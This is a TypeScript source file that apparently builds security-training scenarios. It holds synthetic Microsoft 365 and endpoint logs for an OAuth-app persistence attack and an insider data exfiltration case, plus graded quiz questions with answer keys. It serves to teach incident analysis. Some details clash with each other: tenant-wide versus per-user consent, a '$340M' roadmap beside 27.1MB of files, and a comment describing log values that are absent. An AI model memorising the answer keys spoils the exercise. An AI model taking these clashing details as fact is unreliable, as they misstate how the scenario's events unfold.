        "azure.signinlogs.correlation_id": "b2c3d4e5-f6a1-b2c3-d4e5-f6a1b2c3d4e5",
        "azure.signinlogs.result_type": "0",
        "azure.signinlogs.result_description": "Successfully signed in",
        "azure.signinlogs.app_display_name": "Microsoft 365",
        "azure.signinlogs.client_app_used": "Browser",
        "azure.signinlogs.authentication_requirement": "multiFactorAuthentication",
        "azure.signinlogs.conditional_access_status": "notApplied",
        "azure.signinlogs.risk_level_aggregated": "high",
        "azure.signinlogs.risk_state": "atRisk",
        "azure.signinlogs.is_interactive": "true",
        "azure.signinlogs.tenant_id": "3f7e2a1b-9c8d-4e5f-6a7b-8c9d0e1f2a3b",
        "azure.signinlogs.user_principal_name": "s.chen@cryotech.com",
        "azure.signinlogs.user_display_name": "Sarah Chen",
        "azure.signinlogs.user_type": "Member",
        "azure.signinlogs.device_detail.browser": "Chrome 124.0.0",
        "azure.signinlogs.device_detail.operating_system": "macOS",
        "azure.signinlogs.device_detail.device_id": "(not registered)",
        "azure.signinlogs.device_detail.is_compliant": "false",
        "azure.signinlogs.device_detail.is_managed": "false",
        "azure.signinlogs.location.city": "Frankfurt",
        "azure.signinlogs.location.country_or_region": "DE",
        "azure.signinlogs.mfa_detail.auth_method": "Phone app notification",
        "azure.signinlogs.mfa_detail.auth_detail": "MFA completed in mobile app",
        "azure.signinlogs.authentication_details": "1st factor: Password (success)|2nd factor: Microsoft Authenticator push (accepted by user at 02:40 local)|Context: first sign-in from Germany|Risk: High|CA policy: none matched",
        // ECS fields
        "event.action": "UserLoggedIn",
        "event.outcome": "success",
        "event.created": "2026-05-06T02:40:00.000Z",
        "user.email": "s.chen@cryotech.com",
        "user.title": "Senior Product Engineer",
        "source.ip": sprayIp,
        "source.geo.country_name": "Germany",
        "authentication.status": "success",
        "authentication.mfa": "Authenticator App Push",
        "authentication.factor": "push_notification",
        "risk.level": "High",
        "logon.local_time": "02:40",
        "ca_policy_applied": "none",
      },
    },
    {
      id: "evt_03_app_register", ts: T(15 * MIN),
      source: "o365", vendor: "Microsoft Entra ID", event_type: "account_modify",
      user_email: victim.email, src_ip: sprayIp,
      severity: "critical", mitre_technique: "T1098.001",
      description: `An app named MicrosoftSecurityUpdate was registered in s.chen's tenant from ${sprayIp}, published by microsoftupdate-secure.xyz, requesting Mail.ReadWrite and Files.ReadWrite.All.`,
      raw: {
        // O365 UAL + Entra ID Audit Log — Add application
        "data.office365.Id": "c3d4e5f6-a1b2-c3d4-e5f6-a1b2c3d4e5f7",
        "data.office365.RecordType": "8",
        "data.office365.RecordType_description": "AzureActiveDirectory",
        "data.office365.CreationTime": "2026-05-06T02:45:00Z",
        "data.office365.Operation": "Add application",
        "data.office365.Workload": "AzureActiveDirectory",
        "data.office365.UserId": "s.chen@cryotech.com",
        "data.office365.ResultStatus": "Success",
        "data.office365.ClientIP": sprayIp,
        // Entra ID Audit Log fields
        "azure.auditlogs.operation_name": "Add application",
        "azure.auditlogs.category": "ApplicationManagement",
        "azure.auditlogs.correlation_id": "c3d4e5f6-a1b2-c3d4-e5f6-a1b2c3d4e5f6",
        "azure.auditlogs.target_resources.id": appId,
        "azure.auditlogs.target_resources.display_name": "MicrosoftSecurityUpdate",
        "azure.auditlogs.target_resources.type": "Application",
        // OAuth app detail fields
        "oauth.app.id": appId,
        "oauth.app.name": "MicrosoftSecurityUpdate",
        "oauth.app.publisher_domain": "microsoftupdate-secure.xyz",
        "oauth.app.publisher_verified": "false",
        "oauth.app.requested_permissions": "Mail.ReadWrite|Files.ReadWrite.All|User.ReadBasic.All",
        "oauth.app.redirect_uris": "https://microsoftupdate-secure.xyz/auth/callback",
        "oauth.app.key_credentials_added": "true",
        // ECS fields
        "event.action": "Add application",
        "event.outcome": "success",
        "user.email": "s.chen@cryotech.com",
        "source.ip": sprayIp,
        "application.name": "MicrosoftSecurityUpdate",
        "application.id": appId,
        "application.type": "OAuth2",
      },
    },
    {
      id: "evt_04_consent", ts: T(16 * MIN),
      source: "o365", vendor: "Microsoft Entra ID", event_type: "account_modify",
      user_email: victim.email, src_ip: sprayIp,
      severity: "critical", mitre_technique: "T1528",
      description: "s.chen granted the MicrosoftSecurityUpdate app consent to Mail.ReadWrite, Files.ReadWrite.All and User.ReadBasic.All. The consent was recorded from 91.108.56.199.",
      raw: {
        // O365 UAL + Entra ID Audit Log — Consent to application
        "data.office365.Id": "d4e5f6a1-b2c3-d4e5-f6a1-b2c3d4e5f6a2",
        "data.office365.RecordType": "8",
        "data.office365.RecordType_description": "AzureActiveDirectory",
        "data.office365.CreationTime": "2026-05-06T02:46:00Z",
        "data.office365.Operation": "Consent to application",
        "data.office365.Workload": "AzureActiveDirectory",
        "data.office365.UserId": "s.chen@cryotech.com",
        "data.office365.ResultStatus": "Success",
        "data.office365.ClientIP": sprayIp,
        // Entra ID Audit Log fields
        "azure.auditlogs.category": "ApplicationManagement",
        // OAuth consent detail fields
        // Self-consent: the only kind an ordinary user can grant. It was
        // logged as "AllPrincipals" with is_admin_consent false, which is a
        // contradiction — AllPrincipals is tenant-wide admin consent by
        // definition and a non-admin cannot produce it.
        "oauth.consent.type": "Principal",
        "oauth.consent.scopes_granted": "Mail.ReadWrite|Files.ReadWrite.All|User.ReadBasic.All",
        "oauth.consent.principal_type": "User",
        "oauth.consent.is_admin_consent": "false",
        "oauth.consent.tenant_wide": "false",
        // ECS fields
        "event.action": "Consent to application",
        "event.outcome": "success",
        "user.email": "s.chen@cryotech.com",
        "source.ip": sprayIp,
        "application.id": appId,
        "application.name": "MicrosoftSecurityUpdate",
        "iam.permission": "Mail.ReadWrite, Files.ReadWrite.All",
      },
    },
    {
      id: "evt_05_graph_mail_1", ts: T(1 * HR + 15 * MIN),
      source: "o365", vendor: "Microsoft Graph Security API", event_type: "cloud_api_call",
      user_email: victim.email, src_ip: sessionIp,
      severity: "high", mitre_technique: "T1114.002",
      description: `The MicrosoftSecurityUpdate app read 187 emails from s.chen's inbox via Graph API using an OAuth access token, from ${sessionIp}.`,
      raw: {
        "event.action": "MailItemsAccessed", "event.outcome": "success",
        "user.email": "s.chen@cryotech.com",
        "source.ip": sessionIp,
        "application.id": appId, "application.name": "MicrosoftSecurityUpdate",
        "mail.items_accessed": "187", "mail.folder": "Inbox",
        "authentication.method": "OAuth2",
      },
    },
    {
      id: "evt_06_pw_reset", ts: T(7 * HR),
      source: "ad", vendor: "Microsoft Entra ID", event_type: "account_modify",
      user_email: victim.email, src_ip: "10.10.1.5",
      severity: "medium",
      description: "IT helpdesk reset s.chen's password (ticket INC-4821) after a suspicious sign-in report.",
      raw: {
        // O365 UAL + Entra ID Audit Log — Reset user password (helpdesk action)
        "data.office365.Id": "f6a1b2c3-d4e5-f6a1-b2c3-d4e5f6a1b2c4",
        "data.office365.RecordType": "8",
        "data.office365.RecordType_description": "AzureActiveDirectory",
        "data.office365.CreationTime": "2026-05-06T09:00:00Z",
        "data.office365.Operation": "Reset user password",
        "data.office365.Workload": "AzureActiveDirectory",
        "data.office365.UserId": "it-helpdesk@cryotech.com",
        "data.office365.ObjectId": "s.chen@cryotech.com",
        "data.office365.ResultStatus": "Success",
        "data.office365.ClientIP": "10.10.1.5",
        // Entra ID Audit Log fields
        "azure.auditlogs.category": "UserManagement",
        "azure.auditlogs.initiated_by": "it-helpdesk@cryotech.com",
        "azure.auditlogs.target_user.upn": "s.chen@cryotech.com",
        // Helpdesk context
        "helpdesk.ticket": "INC-4821",
        "helpdesk.reason": "User reported suspicious sign-in activity",
        // ECS fields
        "event.action": "Reset user password",
        "event.outcome": "success",
        "target.user.email": "s.chen@cryotech.com",
        "user.email": "it-helpdesk@cryotech.com",
        "source.ip": "10.10.1.5",
        "oauth.consent_revoked": "false",
      },
    },
    {
      id: "evt_07_graph_mail_2", ts: T(9 * HR + 30 * MIN),
      source: "o365", vendor: "Microsoft Graph Security API", event_type: "cloud_api_call",
      user_email: victim.email, src_ip: sessionIp,
      severity: "high", mitre_technique: "T1114.002",
      description: "The MicrosoftSecurityUpdate app read 143 more emails from s.chen's inbox via Graph API, 2.5 hours after the password reset.",
      raw: {
        "event.action": "MailItemsAccessed", "event.outcome": "success",
        "user.email": "s.chen@cryotech.com",
        "source.ip": sessionIp,
        "application.id": appId, "application.name": "MicrosoftSecurityUpdate",
        "mail.items_accessed": "143",
        "authentication.method": "OAuth2",
      },
    },
    {
      id: "evt_08_sharepoint_dl", ts: T(11 * HR),
      source: "o365", vendor: "Microsoft Graph Security API", event_type: "cloud_api_call",
      user_email: victim.email, src_ip: sessionIp,
      severity: "critical", mitre_technique: "T1530",
      description: "The app downloaded RoadmapQ4-Confidential.pptx (27MB) from the ProductEngineering SharePoint site via Graph API.",
      network: { bytes_out: 27_100_000 },
      raw: {
        "event.action": "FileDownloaded", "event.outcome": "success",
        "user.email": "s.chen@cryotech.com",
        "source.ip": sessionIp,
        "application.id": appId, "application.name": "MicrosoftSecurityUpdate",
        "file.name": "RoadmapQ4-Confidential.pptx",
        "file.size": "27100000",
        "cloud.resource.name": "/sites/ProductEngineering",
        "storage.classification": "Restricted",
        "network.bytes_out": "27100000",
      },
    },
    {
      id: "evt_09_onedrive_bulk", ts: T(12 * HR + 30 * MIN),
      source: "o365", vendor: "Microsoft Graph Security API", event_type: "cloud_api_call",
      user_email: victim.email, src_ip: sessionIp,
      severity: "critical", mitre_technique: "T1530",
      description: "89 files (340MB, including 12 marked Confidential and 4 Restricted) were bulk-downloaded from s.chen's OneDrive in 8 minutes via the same app.",
      network: { bytes_out: 340_000_000 },
      raw: {
        "event.action": "BulkFileDownloaded", "event.outcome": "success",
        "user.email": "s.chen@cryotech.com",
        "source.ip": sessionIp,
        "application.id": appId, "application.name": "MicrosoftSecurityUpdate",
        "file.count": "89", "files.confidential": "12", "files.restricted": "4",
        "network.bytes_out": "340000000",
      },
    },
    {
      id: "evt_10_app_still_active", ts: T(16 * HR),
      source: "o365", vendor: "Microsoft 365 Unified Audit Log", event_type: "ueba_anomaly",
      user_email: victim.email,
      severity: "high",
      description: "Microsoft 365 Security reported the MicrosoftSecurityUpdate app as still active, with 330 emails and 89 files accessed to date.",
      raw: {
        "event.action": "OAuth_AnomalyDetected",
        "application.id": appId, "application.name": "MicrosoftSecurityUpdate",
        "user.email": "s.chen@cryotech.com",
        "alert.name": "Unusual ISP for cloud app access",
        "alert.description": "OAuth application active 16h after compromise, 9h after password reset",
        "mail.total_accessed": "330", "file.count": "89",
      },
    },

    // ── CORRELATED: Baseline — s.chen normal Okta login from Israel ──────────────
    {
      id: "evt_oauth_baseline", ts: T(-60 * MIN),
      source: "okta", vendor: "Okta",
      event_type: "auth_success", severity: "informational",
      user_email: victim.email,
      src_ip: "77.125.38.201",
      description: "s.chen logged in to Okta from Tel Aviv on a registered, managed MacBook.",
      raw: {
        "okta.event_type": "user.session.start",
        "okta.outcome.result": "SUCCESS",
        "okta.actor.login": victim.email,
        "okta.client.ip_address": "77.125.38.201",
        "okta.client.geographic_context.country": "IL",
        "okta.client.geographic_context.city": "Tel Aviv",
        "okta.authentication_context.auth_type": "PASSWORD_IDP",
        "okta.risk.level": "LOW",
        "okta.device.registered": "true",
        "okta.device.managed": "true",
        "GeoLocation.country_name": "Israel",
        "GeoLocation.city_name": "Tel Aviv",
        "event.action": "logged-in", "event.outcome": "success",
        "source.ip": "77.125.38.201",
      },
    },

    // ── CORRELATED: Phishing email that led to s.chen clicking the OAuth consent ─
    {
      id: "evt_oauth_phish_email", ts: T(12 * MIN),
      source: "o365", vendor: "Microsoft Defender for Office 365",
      event_type: "email_received", severity: "high",
      user_email: victim.email, src_ip: "91.108.56.207",
      mitre_technique: "T1566.002",
      description: "s.chen received an email posing as a Microsoft security alert and containing an OAuth consent link.",
      raw: {
        "event.action": "EmailDelivered", "event.outcome": "success",
        "email.from.address": "security-alert@microsoftupdate-secure.xyz",
        "email.to.address": victim.email,
        "email.subject": "Action Required: Verify Your Microsoft Security Settings",
        "email.direction": "inbound",
        "source.ip": "91.108.56.207",
        "spf.result": "fail", "dkim.result": "fail", "dmarc.result": "fail",
        "email.links": ["https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=3a7f8b2c-d491-4e6a-9f3b-1c5d8e7a2b4f&scope=Mail.ReadWrite+Files.ReadWrite.All"],
        "url.malicious_detected": "false",
        "data.office365.SafeLinks.Bypassed": "true",
        "action_result": "delivered",
      },
    },

    // ── CORRELATED: Immediate mailbox access via Graph API after consent ──────────
    {
      id: "evt_oauth_immediate_mailbox", ts: T(17 * MIN),
      source: "o365", vendor: "Microsoft Graph Security API",
      event_type: "cloud_api_call", severity: "high",
      user_email: victim.email, src_ip: sprayIp,
      mitre_technique: "T1114.002",
      description: "The MicrosoftSecurityUpdate app signed in to s.chen's mailbox via Graph API one minute after consent was granted.",
      raw: {
        "event.action": "MailboxLogin",
        "event.outcome": "success",
        "data.office365.Operation": "MailboxLogin",
        "data.office365.ClientIP": sprayIp,
        "data.office365.UserId": victim.email,
        "application.id": appId,
        "application.name": "MicrosoftSecurityUpdate",
        "authentication.method": "OAuth2",
        "mail.folder_accessed": "Inbox",
        "source.ip": sprayIp,
      },
    },
  ];

  const alerts = eventsToAlerts(events, scenarioId);
  const iocs: IOC[] = [
    { type: "ip",     value: sprayIp,                         reputation: "malicious",  tags: ["spray", "germany"] },
    { type: "ip",     value: sessionIp,                       reputation: "malicious",  tags: ["c2", "graph-api-access"] },
    { type: "domain", value: "microsoftupdate-secure.xyz",    reputation: "malicious",  tags: ["rogue-oauth-publisher"] },
    { type: "user",   value: victim.email,                    reputation: "suspicious", tags: ["victim", "compromised"] },
  ];

  const killchain = [
    { ts: T(0),           phase: "Credential Access",   action: "Password spray — 43 failures across 12 accounts below lockout threshold" },
    { ts: T(10 * MIN),    phase: "Initial Access",       action: "s.chen MFA push accepted — account compromised via prompt fatigue" },
    { ts: T(15 * MIN),    phase: "Persistence",          action: "Rogue OAuth app 'MicrosoftSecurityUpdate' registered with broad permissions" },
    { ts: T(16 * MIN),    phase: "Persistence",          action: "OAuth consent granted to the rogue app — the grant outlives the credential reset that follows" },
    { ts: T(1 * HR + 15 * MIN), phase: "Collection",    action: "Graph API reads 187 emails from compromised mailbox" },
    { ts: T(7 * HR),      phase: "Detection Gap",        action: "IT resets password — OAuth consent not revoked, attack continues" },
    { ts: T(11 * HR),     phase: "Exfiltration",         action: "27.1MB confidential product roadmap downloaded via Graph API" },
    { ts: T(12 * HR + 30 * MIN), phase: "Exfiltration", action: "89 files (340MB) bulk-downloaded from OneDrive via delegated OAuth" },
  ];

  const questions: ScenarioQuestion[] = [
    { id: "q1", prompt: "Why did the password reset at T+7h NOT stop the attack?", kind: "single",
      options: [
        { value: "consent",  label: "A consented OAuth app generates tokens using its own credentials — password reset doesn't revoke consent" },
        { value: "cache",    label: "Entra ID replicates password changes asynchronously, so the new password was not enforced for several hours" },
        { value: "token",    label: "The access token issued before the reset stayed valid for its full 60-minute lifetime, covering the gap" },
        { value: "backup",   label: "The attacker had already created a second account with Global Administrator rights and used it instead" },
      ],
      answer: "consent", xp: 75,
      explanation: "The password reset did what it says on the tin — in Entra ID a reset stamps refreshTokensValidFromDateTime and invalidates the app's existing refresh tokens. What it does NOT touch is the consent grant itself, which is a separate object on the service principal. So the app simply acquires a fresh token the next time s.chen signs in, with no second prompt, because she already consented and Entra does not ask twice. That is why the access resumes rather than stops: the helpdesk closed the credential and left the authorisation open. Only revoking the grant in Entra ID → Enterprise Applications removes the app's ability to obtain tokens at all. MFA re-registration is irrelevant here — the attacker never satisfies an authentication factor; the application does the authenticating." },
    { id: "q2", prompt: "Which MITRE technique covers the rogue OAuth application registration?", kind: "single",
      options: [
        { value: "T1078",     label: "T1078 — Valid Accounts" },
        { value: "T1098.001", label: "T1098.001 — Account Manipulation: Additional Cloud Credentials" },
        { value: "T1550.001", label: "T1550.001 — Use Alternate Authentication Material" },
        { value: "T1556",     label: "T1556 — Modify Authentication Process" },
      ],
      answer: "T1098.001", xp: 50,
      explanation: "T1098.001 covers adversaries registering or modifying applications in a cloud tenant to gain persistent access using delegated permissions. A rogue OAuth app holding a user's consent is the textbook example: the persistence lives on the service principal rather than on the account, so credential-centric response — password reset, MFA re-registration — leaves it entirely intact." },
    { id: "q3", prompt: "What is the FASTEST single action to stop ongoing data access through the OAuth app?", kind: "single",
      options: [
        { value: "revoke",  label: "Revoke consent to 'MicrosoftSecurityUpdate' in Entra ID Enterprise Applications" },
        { value: "pw",      label: "Reset s.chen's password again and enforce a stronger complexity requirement in the policy" },
        { value: "disable", label: "Disable s.chen's account in Entra ID and remove her from all mail-enabled groups" },
        { value: "block_ip", label: "Block 185.220.101.88 at the perimeter firewall and in Defender for Cloud Apps" },
      ],
      answer: "revoke", xp: 75,
      explanation: "Revoking app consent immediately invalidates all tokens issued to that application for all users — stopping Graph API access within seconds. Account disable works but disrupts the legitimate user. IP blocking fails since the attacker can rotate IPs. Password reset (as proven) has no effect on OAuth token issuance." },
    { id: "q4", prompt: "Which permissions granted to the app are MOST dangerous? (select all)", kind: "multi",
      options: [
        { value: "mail_rw",   label: "Mail.ReadWrite — read and delete all mail" },
        { value: "files_rw",  label: "Files.ReadWrite.All — full SharePoint and OneDrive access" },
        { value: "user_read", label: "User.ReadBasic.All — read basic user profile info" },
        { value: "calendar",  label: "Calendars.Read — read calendar events" },
      ],
      answer: ["mail_rw", "files_rw"], xp: 100,
      explanation: "Mail.ReadWrite enables reading, modifying, and deleting all email — including financial communications used for BEC. Files.ReadWrite.All provides complete access to all SharePoint sites and OneDrive — enabling bulk data exfiltration as seen here. User.ReadBasic.All is low-risk (public profile data only). Calendars.Read was not granted in this scenario." },
  ];

  return {
    scenario_id: scenarioId,
    title: "OAuth App Persistence — Cloud APT",
    threat_actor: "APT-CLOUDGHOUL (nation-state, cloud-focused IP theft)",
    attack_kind: "oauth_persistence",
    briefing: "Microsoft 365 Security raised an alert on s.chen's account at 18:30 for ongoing mailbox and file access. The helpdesk had already reset this user's password that morning under ticket INC-4821, following a suspicious sign-in report. Queued to you for scoping.",
    narrative: `A Senior Product Engineer's Entra ID account was compromised after accepting an MFA push at 02:40. Within 5 minutes the attacker registered a convincingly named OAuth application ('MicrosoftSecurityUpdate') and granted it tenant-wide consent for mail and file access. When IT reset the password 7 hours later following a user complaint, the Graph API calls didn't stop — the OAuth app silently continued reading emails and downloading files for another 9 hours. By the time the CASB alerted, 330 emails had been read, a confidential $340M product roadmap had been exfiltrated, and 89 additional files totalling 340MB were gone. Your mission: explain the persistence mechanism, determine why the password reset failed, identify the correct remediation, and scope what was exfiltrated.`,
    learning_objectives: [
      "Understand how OAuth application consent creates persistence independent of user passwords",
      "Recognize rogue OAuth app registration as an Entra ID persistence technique (T1098.001)",
      "Identify the critical gap: DLP policies that don't inspect Microsoft Graph API access",
      "Understand why revoking app consent is the correct remediation (not password reset)",
      "Scope data exfiltration from Microsoft Graph API audit logs",
    ],
    alerts, events, iocs, killchain, questions,
  };
}

// =========================================================================
// Scenario 5: Insider Threat — Finance Data Exfiltration
// =========================================================================

export function buildInsiderThreatScenario(scenarioId = "insider-threat-2026"): ScenarioBundle {
  const B = new Date("2026-05-06T13:00:00Z").getTime();
  const T = (ms: number) => new Date(B + ms).toISOString();
  const MIN = 60_000;

  const insider = { hostname: "WS-FIN-4421", email: "m.torres@cryotech.com", ip: "10.10.20.91" };
  const usbSerial = "SanDisk-A3F7B2C1";

  const events: TelemetryEvent[] = [
    {
      id: "evt_01_context", ts: T(0),
      source: "ad", vendor: "Windows Security", event_type: "auth_success",
      hostname: insider.hostname, user_email: insider.email, src_ip: insider.ip,
      severity: "informational",
      description: "m.torres, a Finance Analyst, logged on to WS-FIN-4421 at 13:00; HR records carry a termination flag effective the next day.",
      raw: {
        // Windows Security Event 4624 — Successful Logon (pre-termination day)
        "winlog.event_id": "4624",
        "winlog.channel": "Security",
        "winlog.computer_name": "WS-FIN-4421",
        "winlog.provider_name": "Microsoft-Windows-Security-Auditing",
        "winlog.record_id": "2031174",
        // Subject (SYSTEM on interactive logon)
        "winlog.event_data.SubjectUserSid": "S-1-5-18",
        "winlog.event_data.SubjectUserName": "WS-FIN-4421$",
        "winlog.event_data.SubjectDomainName": "CRYOTECH",
        "winlog.event_data.SubjectLogonId": "0x3E7",
        // New Logon
        "winlog.event_data.TargetUserSid": "S-1-5-21-3421479547-3897544621-1789562108-1309",
        "winlog.event_data.TargetUserName": "mtorres",
        "winlog.event_data.TargetDomainName": "CRYOTECH",
        "winlog.event_data.TargetLogonId": "0x9C3E47",
        "winlog.event_data.LogonGuid": "{C3D4E5F6-A1B2-C3D4-E5F6-A1B2C3D4E5F6}",
        // Logon type and process
        "winlog.event_data.LogonType": "2",
        "winlog.event_data.LogonProcessName": "User32",
        "winlog.event_data.AuthenticationPackageName": "Kerberos",
        "winlog.event_data.WorkstationName": "WS-FIN-4421",
        "winlog.event_data.TransmittedServices": "-",
        "winlog.event_data.LmPackageName": "-",
        "winlog.event_data.KeyLength": "0",
        "winlog.event_data.ImpersonationLevel": "%%1833",
        "winlog.event_data.ElevatedToken": "%%1843",
        // Network / process
        "winlog.event_data.IpAddress": "10.10.20.91",
        "winlog.event_data.IpPort": "0",
        "winlog.event_data.ProcessId": "0x44C",
        "winlog.event_data.ProcessName": "C:\\Windows\\System32\\winlogon.exe",
        // ECS fields
        "event.code": "4624",
        "event.action": "logged-in",
        "event.outcome": "success",
        "event.created": "2026-05-06T13:00:00.000Z",
        "user.name": "CRYOTECH\\mtorres",
        "user.email": "m.torres@cryotech.com",
        "user.title": "Finance Analyst",
        "user.domain": "CRYOTECH",
        "user.id": "S-1-5-21-3421479547-3897544621-1789562108-1309",
        "host.name": "WS-FIN-4421",
        "source.ip": "10.10.20.91",
        "authentication.protocol": "Kerberos",
        "authentication.status": "success",
        "logon.type": "2",
        "logon.type_description": "Interactive (local console)",
        // HR enrichment (cross-referenced from HR system)
      },
    },
    {
      id: "evt_02_sp_start", ts: T(10 * MIN),
      source: "o365", vendor: "Microsoft Purview", event_type: "cloud_api_call",
      user_email: insider.email, src_ip: insider.ip,
      severity: "medium", mitre_technique: "T1530",
      description: "m.torres downloaded 12 files from the Finance SharePoint site in 3 minutes.",
      raw: {
        "event.action": "FileDownloaded", "event.outcome": "success",
        "user.email": "m.torres@cryotech.com",
        "source.ip": "10.10.20.91",
        "cloud.resource.name": "cryotech.sharepoint.com/sites/Finance",
        "cloud.provider": "Microsoft365",
        "file.count": "12", "session.duration_seconds": "180",
      },
    },
    {
      id: "evt_03_dlp_alert", ts: T(25 * MIN),
      source: "o365", vendor: "Microsoft Purview", event_type: "dlp_alert",
      user_email: insider.email, src_ip: insider.ip,
      severity: "high", mitre_technique: "T1530",
      description: "Microsoft Purview DLP fired Finance-PII-Bulk-Download after m.torres downloaded 47 sensitive Finance files (18.2MB) in 15 minutes; policy action was notify-only.",
      raw: {
        "event.action": "DLP_PolicyTriggered", "event.outcome": "success",
        "user.email": "m.torres@cryotech.com",
        "source.ip": "10.10.20.91",
        "policy.name": "Finance-PII-Bulk-Download",
        "policy.rule": "BulkAccessToSensitiveContent",
        "policy.action": "NotifyUser",
        "file.count": "47", "storage.size": "18.2 MB",
        "data.classification": "FinancialPII, HRConfidential",
        "action_result": "notified_not_blocked",
      },
    },
    {
      id: "evt_04_usb_insert", ts: T(30 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_create",
      hostname: insider.hostname, user_email: insider.email,
      severity: "critical", mitre_technique: "T1052.001",
      description: `A SanDisk USB drive (serial ${usbSerial}) was connected to WS-FIN-4421, and 47 files were copied to it within 23 seconds of mounting.`,
      raw: {
        "crowdstrike.event_simplename": "RemovableMediaConnectedEvent",
        "crowdstrike.detection.description": "Removable storage device mounted, followed by bulk file copy within seconds of mount.",
        "crowdstrike.detection.scenario": "removable_media_bulk_copy",
        "crowdstrike.detection.technique": "Exfiltration over USB Device",
        "crowdstrike.detection.technique_id": "T1052.001",
        "event.action": "RemovableMediaConnected",
        "host.name": "WS-FIN-4421",
        "user.name": "CRYOTECH\\mtorres",
        "usb.device.name": "SanDisk MY_USB",
        "usb.device.serial": usbSerial,
        "usb.vendor": "SanDisk",
        "usb.action": "mounted",
        "removable_media.type": "USB Flash Drive",
        "usb.mount_point": "E:\\",
        "file.count": "47",
      },
    },
    {
      id: "evt_05_more_files", mitre_technique: "T1052.001", ts: T(31 * MIN),
      source: "edr", vendor: "CrowdStrike Falcon", event_type: "file_create",
      hostname: insider.hostname, user_email: insider.email,
      severity: "high",
      description: "8 more files, including Employee_Salary_Master_2026.xlsx and Headcount_Reduction_Plan_Nov26.xlsx, were copied from Downloads to the same USB drive.",
      raw: {
        "crowdstrike.event_simplename": "FileWrittenToRemovableMedia",
        "crowdstrike.detection.description": "Multiple sensitive files copied from user Downloads folder directly to a mounted removable media device.",
        "crowdstrike.detection.technique": "Exfiltration over USB Device",
        "crowdstrike.detection.technique_id": "T1052.001",
        "event.action": "FileCopiedToRemovableMedia",
        "host.name": "WS-FIN-4421",
        "user.name": "CRYOTECH\\mtorres",
        "file.directory": "C:\\Users\\mtorres\\Downloads\\",
        "usb.destination": "E:\\Finance_Backup\\",
        "file.count": "8",
        "file.classification": "HRConfidential",
        "usb.device.serial": usbSerial,
      },
    },
    {
      id: "evt_06_cloud_block", ts: T(35 * MIN),
      source: "proxy", vendor: "Zscaler Internet Access", event_type: "http_request",
      hostname: insider.hostname, user_email: insider.email, src_ip: insider.ip,
      dst_port: 443, protocol: "tcp",
      network: { url: "https://www.googleapis.com/upload/storage/v1/b/personal-backup-m/o", domain: "www.googleapis.com", method: "POST", bytes_out: 9_812_445 },
      severity: "high", mitre_technique: "T1567",
      description: "Zscaler blocked a 9.8MB upload attempt from WS-FIN-4421 to a personal Google Cloud Storage bucket.",
      raw: {
        "event.action": "http_request_blocked", "event.outcome": "failure",
        "user.email": "m.torres@cryotech.com",
        "source.ip": "10.10.20.91", "host.name": "WS-FIN-4421",
        "url.full": "https://www.googleapis.com/upload/storage/v1/b/personal-backup-m/o",
        "url.domain": "www.googleapis.com",
        "url.category": "Personal Cloud Storage",
        "http.request.method": "POST",
        "network.bytes_out": "9812445",
        "action_result": "block",
        "policy.name": "Personal-Cloud-Upload-Block",
        "block.reason": "DLP policy — Personal cloud upload blocked",
        "channel.type": "Browser Upload",
      },
    },
    {
      id: "evt_07_email_attach", mitre_technique: "T1567", ts: T(40 * MIN),
      source: "o365", vendor: "Microsoft Purview", event_type: "email_sent",
      user_email: insider.email, src_ip: insider.ip,
      severity: "high",
      description: "m.torres emailed 3 payroll and bonus files (4.2MB) to a personal Gmail address — DLP logged and notified but did not block the send.",
      raw: {
        "event.action": "EmailSent", "event.outcome": "success",
        "email.from.address": "m.torres@cryotech.com",
        "email.to.address": "m.torres.backup@gmail.com",
        "email.subject": "FW: Finance Reports Q2",
        "email.direction": "outbound",
        "email.attachment.name": "payroll-2026-Q2.xlsx, bonus_targets.xlsx, headcount_Q4.xlsx",
        "file.size": "4200000",
        "channel.type": "Email",
        "data.type": "Financial Data, HR Data",
        "policy.name": "Finance-PII-External-Email",
        "policy.action": "AuditAndNotify",
        "action_result": "delivered",
      },
    },
    {
      id: "evt_08_hr_access", mitre_technique: "T1530", ts: T(55 * MIN),
      source: "o365", vendor: "Microsoft Purview", event_type: "cloud_api_call",
      user_email: insider.email, src_ip: insider.ip,
      severity: "medium",
      description: "m.torres, a Finance Analyst, accessed Restricted HR documents (compensation bands, layoff planning) on the HR SharePoint site.",
      raw: {
        "event.action": "FileAccessed", "event.outcome": "success",
        "user.email": "m.torres@cryotech.com",
        "user.title": "Finance Analyst",
        "source.ip": "10.10.20.91",
        "cloud.resource.name": "cryotech.sharepoint.com/sites/HR",
        "data.classification": "HRConfidential, Restricted",
        "iam.permission": "read",
      },
    },
    {
      id: "evt_09_browse", ts: T(75 * MIN),
      source: "proxy", vendor: "Zscaler Internet Access", event_type: "http_request",
      user_email: insider.email, hostname: insider.hostname, src_ip: insider.ip,
      severity: "low",
      description: "m.torres browsed Indeed, LinkedIn Jobs, and Glassdoor from WS-FIN-4421 during work hours.",
      raw: {
        "event.action": "http_request", "event.outcome": "success",
        "user.email": "m.torres@cryotech.com",
        "source.ip": "10.10.20.91", "host.name": "WS-FIN-4421",
        "url.domain": "indeed.com, linkedin.com/jobs, glassdoor.com",
        "url.category": "Job Search",
        "action_result": "allow",
        "user.context": "pending_termination",
      },
    },
    {
      id: "evt_10_logout", ts: T(3 * 60 * MIN),
      source: "ad", vendor: "Windows Security", event_type: "auth_success",
      hostname: insider.hostname, user_email: insider.email, src_ip: insider.ip,
      severity: "informational",
      description: "m.torres logged off WS-FIN-4421 at 16:00, two minutes after the USB drive was removed.",
      raw: {
        "event.code": "4634", "event.action": "logged-off", "event.outcome": "success",
        "logon.type": "0",
        "user.name": "CRYOTECH\\mtorres",
        "host.name": "WS-FIN-4421", "source.ip": "10.10.20.91",
        "usb.removed_at": "15:58:22", "usb.device.serial": usbSerial,
        "device_control.alert_on_removal": "false",
      },
    },

    // ── CORRELATED: Baseline — m.torres normal daily file access volume ───────────
    {
      id: "evt_insider_baseline_files", ts: T(-24 * 60 * MIN),
      source: "o365", vendor: "Microsoft Purview",
      event_type: "cloud_api_call", severity: "informational",
      user_email: insider.email, src_ip: insider.ip,
      description: "m.torres accessed 11 Finance files over a full 8-hour day the day before.",
      raw: {
        "event.action": "FileAccessed",
        "user.email": insider.email,
        "source.ip": insider.ip,
        "cloud.resource.name": "cryotech.sharepoint.com/sites/Finance",
        "file.count": "11",
        "session.duration_seconds": "28800",
        "event.outcome": "success",
      },
    },

    // ── CORRELATED: UEBA alert — bulk download 56x above baseline ────────────────
    {
